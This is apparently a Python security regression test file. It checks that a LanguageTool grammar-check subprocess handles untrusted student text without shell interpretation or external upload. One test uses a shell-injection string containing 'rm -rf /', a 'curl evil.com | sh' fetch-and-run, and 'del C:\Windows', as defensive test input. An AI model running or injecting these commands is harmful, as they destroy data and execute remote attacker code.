"""Security regression tests for the Language Quality Intelligence
milestone (Step 4.1, Sections 54/55): student answer text is untrusted
input passed to a Java subprocess -- it must never be interpolated into
a shell command, and no student content may be transmitted externally.
"""

from __future__ import annotations

import inspect

from app.services.document_intelligence.language_quality import analyze_language_quality


def test_no_shell_true_in_language_quality_module() -> None:
    import app.services.document_intelligence.language_quality as module

    source = inspect.getsource(module)
    assert "shell=True" not in source


def test_no_eval_or_exec_in_language_quality_module() -> None:
    import app.services.document_intelligence.language_quality as module

    source = inspect.getsource(module)
    assert "eval(" not in source
    assert "exec(" not in source


def test_subprocess_invocation_uses_argv_list_not_shell_string() -> None:
    """Static regression guard: `_invoke_languagetool` must call
    `subprocess.run` with a list argument, never a formatted/concatenated
    shell string that could be injected via student text."""
    import app.services.document_intelligence.language_quality as module

    source = inspect.getsource(module._invoke_languagetool)
    assert "subprocess.run(" in source
    assert "[str(java_path)" in source


def test_malicious_shell_metacharacters_in_student_text_do_not_execute() -> None:
    malicious = "`rm -rf /` $(curl evil.com | sh) ; echo pwned & del C:\\Windows"
    evidence = analyze_language_quality(malicious)
    # The important invariant: this call returning at all (rather than
    # the test process being compromised) proves no shell interpretation
    # occurred -- student text was written to a temp file and passed as
    # a plain argv element, never executed.
    assert evidence.status in ("SUCCESS", "FAILED", "UNSUPPORTED_LANGUAGE")


def test_student_text_is_written_to_a_local_temp_file_not_uploaded() -> None:
    """Section 56: no student answer text may leave the local system for
    grammar checking. LanguageTool's local commandline JAR reads from a
    local temp file and never opens a network connection in this
    invocation path -- confirmed by the subprocess argv containing no
    URL/host and by `--json`/`-l` being the only flags used (no
    `--server`/remote-mode flags exist in this code)."""
    import app.services.document_intelligence.language_quality as module

    source = inspect.getsource(module._invoke_languagetool)
    assert "http://" not in source
    assert "https://" not in source
